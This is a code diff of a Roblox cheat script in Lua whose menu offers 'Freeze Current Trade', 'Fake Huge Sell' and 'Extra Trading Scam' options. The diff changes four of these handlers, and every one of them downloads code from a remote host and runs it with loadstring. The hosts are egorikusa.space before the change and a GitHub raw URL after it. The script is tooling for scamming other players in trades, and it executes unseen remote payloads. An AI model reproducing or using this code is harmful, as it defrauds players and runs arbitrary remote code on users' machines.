@@ -105,7 +105,7 @@ Trade:AddToggle(
             Name = "Toggle Anonymous Mode",
             Default = false,
             Callback = function()
-                loadstring(game:HttpGet("https://egorikusa.space/f8b993eb3c8246c74a38318c.lua", true))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
             end
         }
 )
@@ -115,7 +115,7 @@ Trade:AddToggle(
         Name = "Freeze Current Trade",
         Default = false,
         Callback = function()
-            loadstring(game:HttpGet("https://egorikusa.space/f8b993eb3c8246c74a38318c.lua", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
         end
     }
 )
@@ -324,7 +324,7 @@ local Extra = Window:MakeTab({
         Name = "Fake Huge Sell",
         Icon = "rbxassetid://4483345998",
         Callback = function()
-            loadstring(game:HttpGet("https://egorikusa.space/f8b993eb3c8246c74a38318c.lua", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
         end
     })
 
@@ -362,6 +362,6 @@ MiscTab:AddButton({
     Name = "Extra Trading Scam",
     Icon = "rbxassetid://4483345998",
     Callback = function()
-        loadstring(game:HttpGet("https://egorikusa.space/f8b993eb3c8246c74a38318c.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
     end
 })
